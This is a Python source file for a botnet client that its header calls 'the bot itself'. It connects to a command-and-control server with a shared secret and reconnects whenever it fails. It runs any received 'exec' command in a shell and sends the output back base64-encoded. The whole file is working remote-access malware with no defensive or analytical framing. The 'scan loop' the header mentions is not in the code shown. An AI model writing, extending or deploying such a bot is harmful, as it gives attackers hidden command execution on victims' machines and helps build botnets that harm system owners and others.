# bot.py — the bot itself.
# connect to cnc, listen for tasks, run scan loop when idle.

import socket
import base64
import subprocess
import time


class Bot:
    def __init__(self, host, port, secret):
        self.host = host
        self.port = port
        self.secret = secret
        self.sock = None

    def connect(self):
        while True:
            try:
                self.sock = socket.create_connection((self.host, self.port), timeout=10)
                self.sock.sendall((self.secret + "\n").encode())
                return True
            except Exception:
                time.sleep(15)

    def loop(self):
        while True:
            try:
                data = self.sock.recv(4096).decode(errors="ignore").strip()
                if not data:
                    break
                if data == "exit":
                    return
                if data.startswith("exec "):
                    cmd = data[5:]
                    try:
                        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                    except Exception as e:
                        out = str(e).encode()
                    self.sock.sendall(base64.b64encode(out) + b"\n")
            except Exception:
                self.connect()
        self.sock.close()


def run(host, port, secret):
    b = Bot(host, port, secret)
    b.connect()
    b.loop()
